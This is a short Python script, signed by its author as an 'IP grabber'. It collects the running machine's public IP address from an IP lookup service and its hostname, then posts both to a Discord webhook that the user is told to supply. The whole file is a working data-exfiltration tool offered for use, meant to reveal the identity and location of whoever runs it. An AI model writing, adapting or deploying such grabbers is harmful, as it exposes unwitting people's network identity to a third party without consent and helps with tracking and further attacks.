import requests
import json
import socket
from discord_webhook import DiscordWebhook, DiscordEmbed

# getting ip addres
def get_ip():
    r = requests.get('https://api.ipify.org/')
    rct = r.text
    return rct

webhook = DiscordWebhook(url='Put your webhook url here')

# create embed object for webhook
# you can set the color as a decimal (color=242424) or hex (color='03b2f8') number
embed = DiscordEmbed(title=str(socket.gethostname()) + "'s IP", description=get_ip(), color='03b2f8')

# set footer
embed.set_footer(text='IP grabber by Bartuś#6317 | https://github.com/Syntetik008')

# add embed object to webhook
webhook.add_embed(embed)

response = webhook.execute()
